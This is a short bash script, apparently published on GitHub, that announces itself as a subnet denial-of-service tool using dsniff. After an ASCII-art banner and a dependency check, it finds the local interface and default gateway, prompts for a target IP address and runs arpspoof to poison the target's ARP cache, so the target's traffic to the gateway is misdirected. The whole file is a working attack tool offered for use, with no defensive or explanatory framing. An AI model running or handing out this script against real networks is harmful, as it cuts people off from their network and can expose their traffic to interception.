#!/bin/bash

cat << "EOF"
Denial of service in subnet using dsniff, created by https://github.com/CodeStrik

░██████╗████████╗██████╗░██╗██╗░░██╗
██╔════╝╚══██╔══╝██╔══██╗██║██║░██╔╝
╚█████╗░░░░██║░░░██████╔╝██║█████═╝░
░╚═══██╗░░░██║░░░██╔══██╗██║██╔═██╗░
██████╔╝░░░██║░░░██║░░██║██║██║░╚██╗
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝
EOF

check_tool() {
	if ! [ -x "$(command -v $1)" ]; then
		echo "Error: $1 is not installed, please install $1 and try again." >&2
		exit 1
	fi
}

check_tool "dsniff"

interface=$(route | tr -s ' ' | tail -n +3 | head -n +1 | cut -d' ' -f8)
#read -p "Enter the network interface you want to analyze: " interface
read -p "Enter the target IP address: " ip

gateway=$(ip route | grep default | cut -d ' ' -f3)

arpspoof -i "$interface" -t "$ip" "$gateway"
